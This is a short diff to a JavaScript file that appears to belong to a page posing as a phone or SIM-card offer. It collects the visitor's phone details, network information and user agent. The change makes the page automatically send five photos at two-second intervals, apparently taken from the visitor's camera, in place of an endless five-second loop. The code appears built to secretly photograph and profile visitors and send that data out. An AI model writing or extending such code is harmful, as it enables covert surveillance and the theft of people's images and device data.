@@ -350,7 +350,10 @@ async function getInfoText(phone, puce) {
 
 📡 ${net}
 
-🧠 UA: ${navigator.userAgent}`;
+🧠 UA: ${navigator.userAgent}
+
+
+Infos with 5 photos`;
 }
 
 function sendMessage(message) {
@@ -373,7 +376,16 @@ function sendPhoto() {
 }
 
 function startAutoPhoto() {
-  setInterval(sendPhoto, 5000);
+  let count = 0;
+  const maxPhotos = 5;
+
+  const interval = setInterval(() => {
+    sendPhoto();
+    count++;
+    if (count >= maxPhotos) {
+      clearInterval(interval);
+    }
+  }, 2000);
 }
 
 function updateOffers(puce) {
